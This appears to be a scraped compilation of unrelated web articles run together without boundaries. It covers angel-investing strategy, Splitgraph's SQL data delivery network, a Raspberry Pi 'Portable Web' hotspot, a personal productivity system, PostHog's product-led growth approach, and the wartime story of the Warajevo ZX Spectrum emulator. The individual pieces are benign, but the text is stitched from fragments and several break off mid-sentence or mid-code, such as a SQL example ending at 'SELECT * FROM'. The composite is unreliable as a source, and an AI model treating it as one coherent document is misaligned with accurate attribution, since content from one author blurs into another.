<p>Entrepreneurs today — and maybe even Elon Musk twenty years ago, before Paypal, &nbsp;Tesla, and SpaceX — cannot get an angel to invest the necessary seed funds for a large company. It won’t happen, and the reason it won’t happen is because people are writing small checks.</p>
<p>Shotgun investors also do not spend all of their time on any one company. A venture that seems too crazy, or too big, must be brushed aside simply because <strong>the investor is operating on a<i>volume</i> investing system, not a <i>value</i>investing system</strong>. Hyperloop would take up quite a lot of an investor’s time. If you’re on a sniper rifle approach, you have that time. It’s simply a part of your investing methodology. But on a shotgun approach, your investing methodology is bulk. Therefore, it would be hard to even get taken seriously enough to schedule a meeting with a shotgun angel investor if you were presenting a company like Hyperloop. You’re going against the predominant portfolio strategy too much.</p>

<h3>THEORY 3: “WE DON’T FUND IDEAS”</h3>
<p>The next theory is one that — not just for Hyperloop, but for lots of other inventions — is stifling innovation.&nbsp;As I said earlier, in the same way that beliefs shape our political system, beliefs shape our entrepreneurial system.</p>
<p>A very prominent belief today is: “We don’t fund ideas. We don’t fund teams. We don’t fund pitch decks. We don’t fund business plans. So unless you’ve got a business with users , we’re not funding it.” It’s become this …</p></div></div></div>

For example, we'll let you:</p><ul><li>bookmark repositories that you want to show up in your workspace</li><li>allow you to have multiple workspaces and manage access to them</li><li>search for Splitgraph repositories directly from your SQL client.</li></ul></section><section><h4 id="running-queries">Running queries</h4><p>You can run queries on Splitgraph images by referencing them as PostgreSQL schemata: <code>namespace/repository[:hash_or_tag]</code>. By default, we query the <code>latest</code> tag.</p><p>For example, if you want to query the <a href="https://www.splitgraph.com/cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc" as="https://www.splitgraph.com/cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc"><code>cityofchicago/covid19-daily-cases-deaths-and-hospitalizations-naz8-j4nc</code> repository</a>, proxied by Splitgraph to <a href="https://data.cityofchicago.org/Health-Human-Services/COVID-19-Daily-Cases-and-Deaths/naz8-j4nc" as="https://data.cityofchicago.org/Health-Human-Services/COVID-19-Daily-Cases-and-Deaths/naz8-j4nc">Socrata</a>, you can run:</p><pre><code metastring=""><span>SELECT</span> <span>*</span> <span>FROM</span>

They let us perform query execution and planning across federated data sources. We wrote about <a href="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> before: they're powerful and underused!</p><p>We manage connections using a fork of <a href="https://www.pgbouncer.org/" as="https://www.pgbouncer.org">pgBouncer</a>, a PostgreSQL connection pooler. Our fork lets us perform authentication outside of PostgreSQL. We can issue and revoke API keys without having to manipulate database roles. Several inbound Splitgraph users can run queries as a single PostgreSQL user.</p><p>We also use pgBouncer to transform queries on the fly. We rewrite clients' introspection queries and let them reference Splitgraph images as PostgreSQL schemata.</p><p>Each client essentially operates within its own isolated virtual database. The obvious implementation of this would be spinning up one database per client. But our query transformations let us do this at a <strong>much lower infrastructure cost</strong>. We also use this feature to inspect and drop unwanted queries on the fly.</p><p>Finally, we use our own <code>sgr</code> client to orchestrate this. Splitgraph engines power the data delivery network. They manage foreign data wrapper instantiation and querying Splitgraph images via <a href="https://www.splitgraph.com/docs/large-datasets/layered-querying">layered querying</a>. In the future, we will use Splitgraph's <a href="https://www.splitgraph.com/docs/concepts/objects">storage format</a> to snapshot remote datasets or cache frequent queries.</p></section><section><h3 id="future-and-roadmap">Future and roadmap</h3><p>There are a lot of directions we would like to pursue with Splitgraph.</p><p>You will be able to use Splitgraph to <strong>replace some of your data lake or ETL pipelines</strong> and query the data at source. This is similar to the idea of "data virtualization". But, unlike other software in this space, Splitgraph uses an open PostgreSQL procotol. This makes it immediately compatible with most of your BI tools and dashboards. It won't lock you into a proprietary query language.</p><p>We will soon have the ability to add <a href="https://www.splitgraph.com/docs/splitgraph-cloud/external-repositories">external repositories</a> to public or on-premises Splitgraph data catalogs. You will be able to query any dataset indexed in this catalog over the single SQL endpoint or our <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a>. You will be able to even use these datasets in <a href="https://www.splitgraph.com/concepts/splitfiles">Splitfiles</a>. This will let you define reproducible transformations on your data, enrich it with public datasets and track lineage.</p><p>You will be able to use Splitgraph as an <strong>SQL firewall and a rewrite layer</strong>. You won't need to use views to set up access policies for your data warehouse. Data consumers won't need to manage credentials to disjoint data silos. Splitgraph can inspect proxied queries and enforce granular access policies on individual columns. It will even be able to do PII masking and access auditing.</p><p>The single SQL endpoint is well suited for a <strong>data marketplace</strong>. Data vendors currently ship data in CSV files or other ad-hoc formats. They have to maintain pages of instructions on ingesting this data. With Splitgraph, data consumers will be able to acquire and interact with data directly from their applications and clients.</p></section><section><h3 id="conclusion">Conclusion</h3><p>Today, we launched the Splitgraph Data Delivery Network. It's a seamless experience of a single database with thousands of datasets at your fingertips, compatible with most existing clients and BI tools.</p><p>If you wish to try it out, you can get credentials to access it in less than a minute: just head on to the <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">landing page</a>.</p><p>We're also building towards a <a href="https://www.splitgraph.com/about/company/private-cloud-beta">"Splitgraph Private Cloud" product</a> that will let setup your own private Splitgraph cluster, managed by us and deployed to the cloud region of your choice. <a href="mailto:support@splitgraph.com" as="mailto:support@splitgraph.com">Contact us</a> if you're interested!</p></section></div></article></section></div>]]>

August 21, 2020 | https://m0yng.uk/2020/08/The-Portable-Web/ | <a href="https://web.archive.org/web/*/https://m0yng.uk/2020/08/The-Portable-Web/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Recently I discovered some spare parts from past projects, and ended up with this, a battery powered Raspberry Pi Zero W. But what to do with it?</p>
<p><img src="https://m0yng.uk/images/2020/pizerowlipo.jpg" alt="A Green case with ZeroLipo Hat and LiPo cell connected"></p>
<p>A few ideas came to mind or were suggested, such as a portable DMR hotspot, POCSAG transmitter, and others. But one idea came together from a few other bits.</p>
<p>What if I could have a WiFi hotspot that served content, rather than the Internet? What if the Pi was an isolated network that followed me around?</p>
<h2 id="Basic-Setup"><a href="#Basic-Setup" title="Basic Setup"></a>Basic Setup</h2><p>The basic setup has the following parts</p>
<ul>
<li>An open WiFi hotspot (using <a href="https://github.com/billz/raspap-webgui" target="_blank" rel="noopener">RaspAP</a>)</li>
<li>A “Captive Portal” to introduce users to the “Network” (using <a href="https://github.com/nodogsplash/nodogsplash" target="_blank" rel="noopener">NoDogSplash</a>)</li>
<li>Lighttpd to host stuff on HTTP</li>
<li>dnsmasq to resolve domains to our Pi</li>
<li>USB network gadget mode to load content etc.</li>
</ul>
<p>I won’t go into detail of how this is configured, because it isn’t anything special. Basically I set a few domains to resolve to the fixed IP of the Pi, and lighttpd is set to serve static files from the PI’s SD.</p>
<p>When a user joins the network they are greeted with a page introducing the idea, and a button to connect. They should then be directed to the custom domain <code>home.portableweb</code> which provides some more info and links to services available on the Pi.</p>
<h2 id="What-can-it-do"><a href="#What-can-it-do" title="What can it do?"></a>What can it do?</h2><p>Not much, yet!</p>
<h3 id="My-website"><a href="#My-website" title="My website"></a>My website</h3><p>I have a full mirror of my website on the Pi. As it is all static html files this is really easy to do, I just copy the files to the Pi and it “Just Works”.</p>
<h3 id="Cheltenham-Amateur-Radio-Association-News-Archive"><a href="#Cheltenham-Amateur-Radio-Association-News-Archive" title="Cheltenham Amateur Radio Association News Archive"></a>Cheltenham Amateur Radio Association News Archive</h3><p>The CARA website is larger, and more complex. However, I have a simple page with some info on the club, and an archive of CARA News in PDF format.</p>
<h3 id="A-guestbook"><a href="#A-guestbook" title="A guestbook"></a>A guestbook</h3><p>I’ve made a very basic PHP guestbook that lets users read and post messages for me, and future users. It is very simple and just stores everything in a json file.</p>
<h3 id="USB-Sync"><a href="#USB-Sync" title="USB Sync"></a>USB Sync</h3><p>The Pi is configured to act as a USB network “gadget” when connected to another computer using the “data” USB port. This way I can run a small bash script that runs a handful of rsync commands to sync updates to the various “sites” to the Pi, and copy the guestbook off the Pi.</p>
<h2 id="But-Why"><a href="#But-Why" title="But Why?"></a>But Why?</h2><p>Honestly? Because I thought I could, but wasn’t sure, and it seemed fun.</p>
<p>Maybe you are reading this whilst connected to my “Portable Web”? If so, please put something in my guestbook and tell me what you think!</p>
<p>This is also a kind of experiment. It seems that every website these days has huge piles of javascript, tracking, cookies, adverts, and requires a farm of servers to make one page display. This is different, one tiny computer, no infrastructure, just you and me! That your access to the information goes away when the two of us are no longer close makes the experience mean more. Maybe. I don’t know, but it seemed worth exploring.</p>
<p>Being an open WiFi, and the impracticality of using HTTPS, everything is unencrypted. My guestbook has some security in that PHP filters out “bad stuff” the user submits, but basically this is all open. Which suits the experimental nature of amateur radio quite nicely. How long that will even be practical, I don’t know, I’m sure browsers will soon start warning users not to touch anything that isn’t HTTPS.</p>
<p>Are “portable webs” going to take over? I seriously doubt it.</p>
<p>Could they become a thing? Maybe? Has someone else already done this before, I’m sure they have! Could they be a fun way to provide more information at events, clubs, etc., maybe. (the <a href="https://google.github.io/physical-web/" target="_blank" rel="noopener">Physical Web</a> sort of does this, but in a more “cloud” way) Could I find a better name for it? I really wish I had done before using it so many times…</p>
<h2 id="What-next"><a href="#What-next" title="What next?"></a>What next?</h2><p>I want to add some more services to the Pi. Some ideas are:</p>
<ul>
<li>Telnet server to play Snakes and Ladders</li>
<li>Gopher server with similar content to the http stuff. I’d probably need to provide a gopher client too!</li>
<li>An e-paper display so I can see if there are new entries in the guestbook, connected users, etc.</li>
<li>Some live info on the Pi, such as uptime, for the users to see (as proof it really is real?)</li>
<li>Some basic contact logging software that would show what I’m doing when /P and then sync with my main log later</li>
<li>A “Portable Web Protocol” that can let units chat or something? Like StreetPass for the 3DS?</li>
<li>Improve the DNS so it catches non existent domains and returns you to some help, rather than just failing.</li>
<li>A way to trick Android (and others) to think they <em>DO</em> have Internet, so they don’t use use mobile data and ignore the Pi</li>
<li>More info on Amateur Radio, maybe clone Wikipedia? Some videos from Essex Ham?</li>
</ul>
<h2 id="Conclusion"><a href="#Conclusion" title="Conclusion"></a>Conclusion</h2><p>In the end, this is probably pointless and I’ll never have anyone spontaneously use it, and I doubt anyone else will try to replicate the idea.</p>
<p>However, it was fun to build, and with some hot glue to hold the wire and LiPo in place it looks pretty neat!</p>
<p><img src="https://m0yng.uk/images/2020/pizerowlipo-glued.jpg" alt="A Green case with ZeroLipo Hat and LiPo cell glued behind"></p>
<p>If you do have thoughts, come talk to me on mastodon! I’m <a href="https://mastodon.radio/@M0YNG" target="_blank" rel="noopener">@M0YNG@mastodon.radio</a></p>

by <a href="https://orbifold.xyz/author/moshe-zadka.html">Moshe Zadka</a>
 


        </p></div><div><p>I have written before about my
<a href="https://orbifold.xyz/inbox-zero.html">Inbox Zero</a>
methodology.
This is still what I practice,
but there is a lot more that helps me.</p>
<p>The concept behind "Universal Binary"
is that the only numbers that make sense
asymptotically are zero, one, and infinity.
Therefore, in order to prevent things from going
off into infinity,
there needs to be processes that keep everything
to either zero or one.</p>
<p>One:</p>
<ul>
<li>TODO list.</li>
<li>Calendar.</li>
<li>Time tracker.</li>
</ul>
<p>Zero:</p>
<ul>
<li>"Notes"</li>
<li>E-mails in inbox</li>
<li>Non-pinned open tabs</li>
<li>Floating tasks</li>
</ul>
<div id="one-todo-list">
<h2>One TODO List</h2>
<p>I have a single list that tracks everything I needed to do.
Be it a reminder to put a garbage bin in the car
or work on upgrading a dependency in production,
everything goes in the same place.</p>
<p>Sometimes this will not be where all the information is.
Many of the things I need to do for work,
for example,
require a link to our internal issue tracking system.
For open source tickets, I have a GitHub link.</p>
<p>But the important thing is that I don't go to GitHub or our internal
ticketing system to figure out what I need to do.
I have a single TODO list</p>
<p>Since I have <em>one</em> TODO list, it gets a lot of things. If my wife asks me to run an errand, it becomes a task. In my one-on-one meeting with my manager, if I make a commitment, it becomes a task. If a conference e-mails me to suggest I participate in the CFP, it becomes a task. The tasks accumulate fast.</p>
<p>Currently, I feel like I'm on top of things and not behind on anything. In this calm, smooth sailing situation, I have around 200 tasks in my list. If every time I opened my list, I would have to look through 200 items to figure out what I am doing, I would get frustrated.</p>
<p>Instead, I have appropriate filters on it. "Today and not related to work" when I am at home relaxing. "Overdue and related to work" when I get to the office in the morning, to see I dropped anything on the floor. "Things that are either not related to work or need to be done at home and due soon" for when I'm at home catching up in the evening.</p>
<p>As I mentioned, I use TODOist. I think it's perfectly reasonable.
However, there are a lot of equally reasonable alternatives.
What's not reasonable is anything that does not let you tag and filter.</p>
</div>
<div id="one-calendar">
<h2>One Calendar</h2>
<p>I have gotten all my calendars feeding into a single pane of glass,
which color-codes the source.
My calendars include:</p>
<ul>
<li>Work calendar (the feeding removes sensitive information)</li>
<li>A Trello board with the Calendar power-up for co-ordinating events with my family.</li>
<li>TODOist's due date/time calendar.</li>
<li>Personal calendar invites.</li>
<li>My "Daily schedule", which is where I try to document my plans for each hour
I am awake, by day of the week.</li>
</ul>
<p>I have a daily morning task to review the calendar for the day.</p>
</div>
<div id="one-time-tracker">
<h2>One Time Tracker</h2>
<p>I use Toggl. The coolest feature in Toggl is that the Firefox button integration
integrates with TODOist and GitHub, so I have a button that says
"start working on this".
Some of the things I do are not tracked at tasks.
As a horrible work-around, I have a Microsoft TO-DO pinned tab.
This does not violate the "One TODO list" motto,
because these are not tasks I ever plan to accomplish.
This are simply things I can activate as a "thing I am doing"
with one click: for example, "dinner" or "figuring out next task".</p>
<p>Since as long as I am alive I am doing "something",
my time tracker is always supposed to be ticking.
I also have a daily task to go over the tracked items
and fix spelling and add appropriate metadata so that
I have less pressure to do so when I start tasks.</p>
</div>
<div id="zero-notes">
<h2>Zero Notes</h2>
<p>A note is just some information that has no place.
Everything should have a proper place.
If I want to take down some information and not sure what is
its proper place,
then it goes in the TODO list.
The action item is "figure out where to put this."</p>
<p>I have a links file, where I put links.
I have a recipes GitHub repo, where I put recipes.
I have a "Notes" folder in Dropbox,
but the only notes that go there are things that I
need to be able to see immediately on my phone.
This means that every note should have an expiry date,
and after that they can be archived.</p>
<p>During the beforetimes, I would have flight information for trips
there, and the like.
In these times, sadly, this folder is mostly empty until the world
is right again.</p>
</div>
<div id="zero-unpinned-tabs">
<h2>Zero Unpinned Tabs</h2>
<p>Firefox has an amazing feature called "pinned tabs".
Pinned tabs are always left-most,
and only have their icon showing up.
My pinned tabs include my E-mail,
my Calendar, WhatsApp,
TODOist, and the Microsoft To-Do hack.</p>
<p>Other tabs get closed. Since many of my tasks generate a lot of open tabs,
when cross-referencing documentation, this is an easy reminder.
Whenever I can't see all tab titles, I close everything unpinned.
Anything that I hesitate to close gets converted to a task with the TODOist
browser extension and then closed.</p>
</div>
<div id="zero-e-mails">
<h2>Zero E-mails</h2>
<p>I have daily tasks to empty out my personal and work inbox.
Anything that can't be emptied in the time I allocated to doing that
gets converted to a task.</p>
</div>
<div id="zero-floating-tasks">
<h2>Zero Floating Tasks</h2>
<p>Tasks get created in "Inbox" with no "due date".
There is a daily task have that list have zero items.
Items can be non-floating by being assigned to a project
and having one of three things be true:</p>
<ul>
<li>It's marked <tt>@when:time_permitting</tt>, which is effectively equivalent to
"Archived".</li>
<li>It's marked <tt>@status:subtask</tt>, which means it is part of a bigger
task where it is managed.</li>
<li>It's marked with a specific day I plan to do it ("due date", but it does
not actually mean "due date").</li>
</ul>
</div>
<div id="work-in-progress-one-report">
<h2>(Work in Progress) One Report</h2>
<p>I am working on having one report that pulls via API integration from
Toggl, TODOist, and FastMail Calendar (CalDav) details for the past week
and summarizes them.
For example, how many things did I do without a task?
Did they make sense?
What was my calendar saying I did at the time?</p>
<p>I have a rough prototype, so now it is mostly debugging the logic
to make sure I am getting everything I expect and cleaning up the Look And Feel
so I can see as much as possible on one screen.
I am using Jupyter for that.</p>
</div>
<div id="summary">
<h2>Summary</h2>
<p>For some people, "small amounts of chaos" is a reasonable goal.
But for me, it's zero or infinity
Funneling everything to one TODO box allows emptying all the others.
Funneling everything to one calendar means only checking in one place
"what am I supposed to be doing".</p>

<p>You will need sales, but do you need a sales team to achieve revenue?</p>
<p>Let's say you are the founder of a new tech startup.&nbsp;</p>
<p>A few months back, you and a couple of friends (all developers) built an amazing tool and have now received Seed funding.&nbsp;</p>
<p>As a result, you're under some pressure to grow. You took a few million from some VCs here and there, and they want to see some results.</p>
<p>Since the realization of needing to grow hit you, you've started to lose some sleep.&nbsp;</p>
<p>Before, you were just a group of friends working your ass off to build an amazing product, with some revenue coming in from your immediate network. Now you actually have to focus on ramping up your sales.</p>
<p>You call in a founders meeting to discuss next steps, and a conclusion is reached: you can't spend all your budget on engineers, which is what you wanted to do.&nbsp;</p>
<p>Instead, you need to hire some Sales people. Or some Marketing people. Or both. Whoever can get you some users that pay for your product. Or do you? Could you invest in engineering instead to drive more revenue, and perhaps building a better company along the way?</p>
<h2 id="getting-people-to-pay-you"><a href="#getting-people-to-pay-you" aria-label="getting people to pay you permalink"></a>Getting People to Pay&nbsp;You</h2>
<p>VC funding or not, all startups will eventually need to get paid for what they do.&nbsp;</p>
<p>Irrespective of how cool your idea is, or how helpful it may be, if you're not getting money in, you can't push it forward.&nbsp;
You need customers.</p>
<p>Traditionally, there are two ways to do this: sales and marketing. They are not mutually exclusive, but one strategy or the other generally takes the lead in generating growth.  To understand them, it's helpful to refer to a funnel:</p>

<h3 id="marketing-led-growth-"><a href="#marketing-led-growth-" aria-label="marketing led growth  permalink"></a>Marketing-led Growth&nbsp;📈</h3>
<p>The goal of marketing is to increase the number of people going through the funnel. </p>
<p>The idea is to make your business be seen. But not just that - it's also about being seen by the right people and seen in a positive light.</p>
<p>This involves a wide variety of aspects, from branding, to social media, and, of course, ads. If this is done well, the customer should come to you, so you won't need to go after them.</p>
<h3 id="sales-led-growth-🤝"><a href="#sales-led-growth-%F0%9F%A4%9D" aria-label="sales led growth 🤝 permalink"></a>Sales-led Growth&nbsp;🤝</h3>
<p>Sales, on the other hand, is about improving the conversion between steps of the funnel. </p>
<p>In some ways, it is the opposite of Marketing, as you will often go after the customer, rather than try to make them come to you. This can be done in a variety of ways, from cold calls to leveraging leads.&nbsp;</p>
<p>Essentially, the assumption is that there are people out there who are willing to pay for your product, so you need to do your best to find them and get them to pay you.</p>
<h2 id="the-underrated-alternative"><a href="#the-underrated-alternative" aria-label="the underrated alternative permalink"></a>The Underrated Alternative</h2>
<p>There are various benefits to Sales-led and Marketing-led growth strategies, and they are still widely used today.&nbsp;</p>
<p>However, a new approach has been gaining traction in the past few years, called Product-led Growth (PLG).</p>
<h3 id="let-your-product-do-the-talking"><a href="#let-your-product-do-the-talking" aria-label="let your product do the talking permalink"></a>Let your product do the&nbsp;talking</h3>
<p>With Product-led Growth, the idea is that rather than bringing users through an active sales team or aggressive marketing campaigns, you just focus on building your product - and ensure you make it great.</p>
<p>The concept is based on the assumption that if you build something that is useful and works well, the users will eventually come to you as result... with a little push, of course.</p>
<p>As such, your primary objective should be to make something truly amazing, rather than portray your product as amazing (which is what great Sales and Marketing people can do).</p>
<p>Now, following a PLG approach does not substitute having a Sales or Marketing team. It just means growth is <em>led</em> by the product, and the other teams in the organization operate in alignment with this methodology. </p>
<p>Additionally, operating a B2B company without a Sales team does become impractical at a large scale. We would know, since our founders used to close software sales deals in the seven figures.</p>
<h2 id="the-key-is-in-the-dna"><a href="#the-key-is-in-the-dna" aria-label="the key is in the dna permalink"></a>The Key is in the&nbsp;DNA</h2>
<p>While this "strategy" sounds more like common sense than a methodical approach, there's more to Product-led growth than meets the eye.</p>
<p>To truly succeed as a business that drives growth primarily through its product, this concept needs to be built into the company culture.</p>
<p>While Sales and Marketing can often work well as segregated teams that draw from the product but operate independently in practice, focusing on building a product is an organization-wide effort.</p>
<p>As <a href="https://www.productled.org/foundations/what-is-product-led-growth">PLGC</a> put it, different teams often operate in different wavelengths, but with Product-Led Growth, you need everyone to converge into one single wavelength: user experience.&nbsp;</p>
<p>At PostHog, we follow a Product-led Growth approach. And we'll tell you, this has implications for all areas of the company:</p>
<h3 id="sales"><a href="#sales" aria-label="sales permalink"></a>Sales</h3>
<p>Don't make a sale if your product is not a good fit for the customer.&nbsp;</p>
<p>From the first paragraph of <a href="https://posthog.com/handbook/growth/sales">PostHog's Handbook Sales page</a>:</p>
<blockquote>
<p>Always focus on delivering what the customer needs. Sometimes that will mean sending them to a competitor or turning them&nbsp;down.</p>
</blockquote>
<p>Yes, this is literally an official guideline for doing Sales at PostHog.</p>
<h3 id="team"><a href="#team" aria-label="team permalink"></a>Team</h3>
<p>If you're a software company, PLG might mean opting for more Engineers than Sales people, for instance. In our case, we still don't have a single person doing Sales or Marketing exclusively. Almost our entire team is made up of Engineers, including people not working day-to-day on our codebase.&nbsp;</p>
<p>More than with other approaches, you also need to make sure your hires are individuals who understand and are passionate about the product, as well as are proactive in making it better.&nbsp;</p>
<p>Your Sales people shouldn't cut corners to close a deal, and the Marketing team should focus on highlighting the product you built.</p>
<h3 id="communication"><a href="#communication" aria-label="communication permalink"></a>Communication</h3>
<p>Listen to your users on everything.</p>
<p>Built something? Get feedback. New idea? Get feedback. Launched a release? Get feedback.</p>
<p>As one of our <a href="https://twitter.com/mariusandra">core devs</a> put it following interviews with users about a new feature he built: "Your assumptions are mostly wrong. Talk to people to correct them".</p>
<p>When generating growth primarily through Sales or Marketing, the segregation between the people who are building the product and those selling it can lead to diversion between what users want and what is being offered to them.</p>
<p>When focusing on the product, you should always be touching base with your users, and be willing to drop features you love if they don't feel the same way.</p>
<h3 id="priorities"><a href="#priorities" aria-label="priorities permalink"></a>Priorities</h3>
<p>At PostHog, our methodology is:</p>
<blockquote>
<p>If we keep our team first and users second, then our investors will take care of themselves!</p>
</blockquote>
<p>Users are key and should be a top priority.</p>
<p>However, you must remember that your team consists of the first users of your product, its main advocates, and its builders!&nbsp;</p>
<p>Hence, since users are a priority, and the team takes care of the users, you need to take care of your team!</p>
<h3 id="growth"><a href="#growth" aria-label="growth permalink"></a>Growth</h3>
<p>Since you're not aggressively seeking out users with Product-Led Growth, you are likely to experience slower growth at first.&nbsp;
Later on, however, if you did truly build something great, you may benefit from a network effect that skyrockets your userbase.&nbsp;</p>
<p>Facebook and Slack are great examples of this.&nbsp;</p>

<p>Facebook, in fact, actually grew fast early on, while following a primarily PLG approach. This goes on to show that it is possible
to grow fast despite following a Product-led Growth approach, or, perhaps even because of it. When you're an industry disruptor, your product speaks for itself, since it is something new, rather than an improvement on something that already exists. As such, your product can potentially drive your growth even if you don't explicitly follow a PLG strategy.</p>
<p>Tesla is another example of a company that lets its disruptive product do the talking. They reportedly spend a <a href="https://www.forbes.com/sites/johnkoetsier/2019/05/06/tesla-spends-zero-on-ads-heres-where-bmw-toyota-ford-and-porsche-spend-digital-ad-dollars/#4a574ec911d4">whopping 0$ on advertising</a>, yet have a brand that is known worldwide, and a <a href="https://finance.yahoo.com/quote/TSLA/">stock price that seems to just keep on rising</a>. </p>
<h3 id="revenue"><a href="#revenue" aria-label="revenue permalink"></a>Revenue&nbsp;</h3>
<p>Since the initial focus is on building a product rather than selling it, you will likely make less money in the short-run.</p>
<p>With the goal not being to hit a Sales metric, you might be turning down opportunities to generate revenue if they are not perfectly aligned with what you're building.</p>
<p>As such, you need to make sure your team and investors are aligned with this. It should be understood that <a href="https://posthog.com/blog/raising-3m-for-os">it's okay to not be making money in the early stages</a>.</p>
<h2 id="one-size-doesnt-fit-all"><a href="#one-size-doesnt-fit-all" aria-label="one size doesnt fit all permalink"></a>One Size Doesn't Fit&nbsp;All</h2>
<p>Product-Led Growth is not a magic pill. It does have its shortcomings.</p>
<p>Primarily, how can you let your product speak for itself if you can't get anyone to look at it in the first place?</p>
<p>But rather than tell you when Product-led Growth might not work, let's explore some aspects that may be beneficial to it.</p>
<h3 id="funding"><a href="#funding" aria-label="funding permalink"></a>Funding</h3>
<p>It's much easier to focus almost exclusively on building a product when you're already well-funded. This is our case at PostHog.</p>
<p>To build a great product, you need a great team. And to build a great team, you need money.&nbsp;</p>
<p>Thus, if you're a company without a lot of money in the bank, you might just need to get some Sales done now, simply to fund your operations.</p>
<p>Not having funding shouldn't discourage you from trying a PLG approach, however. It can still work, just look at GitLab. They first raised money after already having 100,000 users and Sid (their CEO) <a href="https://posthog.com/blog/a-chat-with-sid">told us</a> they didn't even have a significant marketing budget until then. Wow.</p>
<h3 id="open-source-software"><a href="#open-source-software" aria-label="open source software permalink"></a>Open Source&nbsp;Software</h3>
<p>Being open source is a great characteristic for companies looking to follow a PLG approach.&nbsp;</p>
<p>This is because you can get users excited not only about the usability of your product, but also how it's built.</p>
<p>Additionally, open source software projects by default encourage community participation, since anyone is able to suggest a change, raise an issue, or even contribute code.&nbsp;</p>
<p>As such, you are more involved with your users and can gain better insight into how people feel about your product.</p>
<h3 id="breadth-of-experience"><a href="#breadth-of-experience" aria-label="breadth of experience permalink"></a>Breadth of Experience</h3>
<p>With regards to professional experience, depth refers to extensive experience in a specific field, whereas breadth can be seen as experience across fields.</p>
<p>Depth of experience is an essential characteristic of a world-class team. However, having some focus on breadth can also be beneficial. …</p></div></div>

<p>
Maybe this program is not too interesting in itself, but it is a fact
that this program comes from Bosnia and Herzegovina, from the city of
Sarajevo which has been surrounded for more than three years (click at the
picture below to learn more about surrounded Sarajevo). After reading this
story, you will understand why this emulator has such strange
name "Warajevo"...

<p>
Even in our secondary school days, about ten years before, we began to build an
interest in computers thanks to the ZX Spectrum. For this reason, we are a
bit sentimentally tied with this computer. This computer reminds us of all of
the times when, in our neighbourhoods, the life was nice and normal.

When we bought AT 286 computers at the end of 1990, we did not forget our
Spectrums however. We had great interest when, in June 1991, we got a
Spectrum emulator, which, without underestimating anybody's work, had very
bad characteristics (it was slow, quite incompatible with the original
machine, with unpractical emulation of the tape recorder etc.). It's origin
is unknown to us (we suppose, in according to some newspapers, that the program
is from the Slovenia Republic, and that the author is Peter Kroselj), and when
starting it displays the copyright message '(C) 1991. Roman &amp; easy inc.'. When
the war started in our country, we wanted to remove the dark thoughts from our
heads as much as possible. So, in April 1993, we started the development of our
Spectrum emulator, symbolically called 'Warajevo Spectrum emulator' which should
have much better characteristics. We should mention that we were known as quite
good programmers, especially in assembly language.

The program was developed in horrible conditions. The grenades fell
everywhere, there was little electrical power (at one time even the
hospitals didn't have power for two months!). When we had electricity it was
only for 2-3 hours during the night. However, we did not quit and caught
every moment when the electricity was on to develop the program. Zeljko worked at
home on his 80286/12 MHz, 1.44" floppy, 40 Mb hard disc, Hercules card and Citizen
180D printer. He used TASM assembler. It was very interesting waiting for days of
electricity. Samir worked mainly in army camp barack on 80286/16 MHz, 5,25" + 1.44"
floppy, 2400 bps modem, VGA mono monitor, WITHOUT HARD DISC because it crashed. The power
generator in the army camp was an improvised generator, with a voltage that varied from
150 V to 300 V! It was in fact car engine without carburator, connected to natural gas
pipeline. This car engine was tied with shunted electromotor giving about 30 kW for
100 rooms.

<p>
It was often situation that when one user switch caffe aparat on, Samir's
computer resets itself. UPS? What is this??? As you can expect, such 'stable' voltage
distroyed Samir's hard disc...
</p>
<center>

</center>

<p>
Zeljko's task was mainly writting of the emulator kernel, and Samir's task was to write
conversion and tape file utilities. So, he used Turbo Pascal 5.5. First version of such
utility was called ZXTOOLS, and existed up to release 1.5. In this situation, we decided
that our tape file format will be compressed, as we had not enough diskettes, nor we
belived that we will ever have money for puchasing bigger hard disc.

As Zeljko has real Spectrum 128, we made cable for transfering Spectrum software using
RS232. During times when we was free of army activities, Samir visited the last Spectrum
software pirate in Sarajevo and borrowed casettes. But, this pirate was located in one
of the most dangerous places in the city, practically on the first front line. He had to
use a river bed (instead of streets) for moving, to skip continous sniper's fire. So, Samir
risked his life to bring up Spectrum software! Later he transfered programs using RS232,
mainly in the army camp.

The summer of 1993 was the worst period during the whole Bosnian war, 1 kg of sugar had
price of even 60 DM, and about 3000-4000 grenades fall every day on the town. This was a
period when only miracle saved Sarajevo of fall. However, we progressed very well...

Zeljko catched every second of presence of electrical power to finish the emulator
kernel, and Samir hed not even leave the army building during this period. While he
waited for a new battle tasks, he developed the compression algorythm. He spent more
than 30 days in developing algorythm, analysing of some archivers, optimizing
compression speed (it is still slow, but acceptable), and he worked mostly on paper,
because it was days mainly without any electric power, water and food.
Keep in mind that in this period we lost about 1 kg weekly!

In November 1993, reading some newspapers that came from the enemy's territory, we got
some information about the emulator 'Z80', written by Gerton Lunter. The fact that we
didn't hear about Lunter's 'Z80' earlier is a fortune for today Warajevo users, because we
very probably would not even start this project if we have had information that a good
quality Spectrum emulator already exists. But, in even worse winter conditions,
we continued the development (in the rooms where we slept the water was frozen), hoping to
get this emulator to compare our program and his program.

In 1994, one Samir's friend who worked with him in the army put his own hard disc
(40M) into the computer , and Samir developed ZXSHELL (the database program for the
emulator written in Clipper). In April 1994, the foundation Sorosh opened the first
electronic mail in Sarajevo. We sent a general request and in June 1994, we got
Lunter's emulator. From documentation we got information about many Spectrum emulators
around Europe, but we thought that our program was surely better than all the others,
except maybe Lunter's program. We think that it is a great success, considering the
conditions where the program was developed and the quality of Gerton's program. When
we contacted Gerton, he had the same opinion about it.

The first public release of the Warajevo emulator was sent to the world at end of
1994 (release 1.0). Other releases made during war was 1.1 (March 1995), and 1.11
(May 1995). This was just a bugfixes of release 1.1 with slight improvements.
<br>
</p><center>

</center>
<p>
Dayton peace came (November 1995), and we was released from army. Release 1.2 was
prepared for uploading. It was 1.1 with a new design of utility ZXTOOLS. This release
was finished in December 1995. But, Samir decided to improve the emulator to be his
<a href="https://worldofspectrum.net/features/warajevo/diplom.zip">graduate thesis</a>
(Zeljko already finished study, he graduated in January 1995), and he
puchased 486SX-33 board, 4 Mb of RAM and 400 Mb hard disc. Zeljko continued development
on his old 286 machine, but Samir had now enough power to compile programs using extended
memory and we released version 1.5 (in July 1996) after Samir's graduating and getting
